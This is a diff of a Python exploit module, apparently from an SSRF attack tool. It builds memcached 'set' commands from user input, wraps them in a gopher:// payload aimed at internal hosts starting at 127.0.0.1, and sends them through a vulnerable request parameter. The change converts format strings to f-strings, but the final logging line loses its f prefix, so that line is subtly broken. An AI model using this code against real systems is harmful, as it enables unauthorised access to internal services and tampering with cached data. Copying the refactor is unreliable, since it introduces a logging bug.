@@ -13,12 +13,12 @@ class exploit():
     SERVICE_DATA = "\r\n"
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
         gen_host = gen_ip_list("127.0.0.1", args.level)
         payload = input("Data to store: ")
 
-        self.SERVICE_DATA += 'set payloadname 0 0 {}\r\n'.format(len(payload))
-        self.SERVICE_DATA += '{}\r\n'.format(payload)
+        self.SERVICE_DATA += f'set payloadname 0 0 {len(payload)}\r\n'
+        self.SERVICE_DATA += f'{payload}\r\n'
         self.SERVICE_DATA += 'quit\r\n'
         self.SERVICE_DATA = urllib.parse.quote(self.SERVICE_DATA)
 
@@ -26,9 +26,9 @@ class exploit():
             payload = wrapper_gopher(self.SERVICE_DATA, self.SERVICE_IP, self.SERVICE_PORT)
 
             if args.verbose == True:
-                logging.info("Generated payload : {}".format(payload))
+                logging.info(f"Generated payload : {payload}")
 
             r = requester.do_request(args.param, payload)
 
             if args.verbose == True:
-                logging.info("Module '{}' ended !".format(name))
+                logging.info("Module '{name}' ended !")
